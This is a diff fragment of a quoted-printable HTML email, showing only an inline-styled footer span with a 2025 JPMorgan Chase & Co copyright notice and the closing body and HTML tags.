+<SPAN style=3D"FONT-SIZE: 12px; BORDER-TOP: 0px; FONT-FAMILY: Arial, Helvet=
+ica, sans-serif, serif, EmojiFont; BORDER-RIGHT: 0px; VERTICAL-ALIGN: top; =
+WHITE-SPACE: normal; WORD-SPACING: 0px; BORDER-BOTTOM: 0px; TEXT-TRANSFORM:=
+ none; FONT-WEIGHT: 400; COLOR: rgb(113,113,113); PADDING-BOTTOM: 60px; FON=
+T-STYLE: normal; PADDING-TOP: 20px; PADDING-LEFT: 30px; BORDER-LEFT: 0px; O=
+RPHANS: 2; WIDOWS: 2; MARGIN: 0px; LETTER-SPACING: normal; PADDING-RIGHT: 3=
+0px; BACKGROUND-COLOR: rgb(255,255,255);=20
+TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
+decoration-style: initial; text-decoration-color: initial; font-variant-num=
+eric: inherit; font-variant-east-asian: inherit; font-variant-alternates: i=
+nherit; font-variant-position: inherit; font-variant-emoji: inherit; font-s=
+tretch: inherit; font-optical-sizing: inherit; font-size-adjust: inherit; f=
+ont-kerning: inherit; font-feature-settings:=20
+inherit; font-variation-settings: inherit; font-language-override: inherit"=
+ data-olk-copy-source=3D"MessageBody">&copy; 2025 JPMorgan Chase &amp; Co</=
+SPAN></BODY></HTML>
